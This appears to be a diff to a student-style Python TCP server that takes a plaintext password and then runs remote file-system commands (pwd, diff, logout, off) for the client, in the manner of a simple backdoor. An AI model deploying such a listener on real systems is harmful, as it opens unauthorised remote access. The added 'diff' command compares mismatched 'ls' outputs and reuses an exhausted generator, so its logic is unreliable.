@@ -1,6 +1,8 @@
 import socketserver
 import socket
 import sys, os, shutil
+import difflib
+
 class MyTCPHandler(socketserver.BaseRequestHandler):
 
    
@@ -41,8 +43,8 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                break
            data = data.decode( "utf-8")
 
-           if (passed == False):      # compare user entered password and the actual password
-               if (data.split(None, 2)[0] == password):                           
+           if (passed == False and len(data) > 0):      # compare user entered password and the actual password
+               if (data.strip() == password):                           
                    self.request.sendall(bytearray("welcome boss\n", "utf-8"))
                    passed = True
                    continue
@@ -51,7 +53,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                           
            # start commands here
            if passed == True:
-               
+
                # pwd
                if data.strip() == "pwd":
                    self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8")) 
@@ -148,22 +150,41 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                   self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                   continue
 
-
-                  
                # logout
                if data.strip() == "logout":
-                   self.request.sendall(bytearray("bye bye", "utf-8"))
+                   self.request.sendall(bytearray("bye bye\n", "utf-8"))
                    break 
 
                 # off
-               if data.split(None, 1)[0] == "off":
+               if data.strip() == "off":
                   print("Terminating myself...")
                   self.request.sendall(bytearray("Terminating myself...So long\n", "utf-8"))
                   os._exit(1)                                                       #exit without ptinting traceback
                 
-                
+               # diff 
+               if data.strip() == "diff":
+                   m = os.popen("ls -l")
+                   m = m.read()
+                   n = os.popen("ls")
+                   n = n.read()
+                   m = m.splitlines() 
+                   n = n.splitlines()
+                   #m = "abd defg".splitlines()
+                   #n = "abc defg".splitlines()
+                   difference = difflib.ndiff(m, n)
+                   for a in difference:
+                       if len(a.split()) > 1:                   # prevent going out of index
+                           b = a.split(None, 1)
+                           del b[0]
+                           b = "".join(b)
+                           if a.split()[0] == "+":              # check if added
+                               self.request.sendall(bytearray(b + " - was added\n", "utf-8"))
+                           elif a.split()[0] == "-":            # check if deleted
+                               self.request.sendall(bytearray(b + " - was deleted\n", "utf-8"))
+                           elif a.split()[0] == "?":            # check if changed
+                               self.request.sendall(bytearray(b + " - was changed\n", "utf-8"))
+                   self.request.sendall(bytearray("\n".join(list(difference)), "utf-8"))
 
-                  
                ######                     #####
                #                              #
                #    ADD MORE COMMANDS HERE!   #
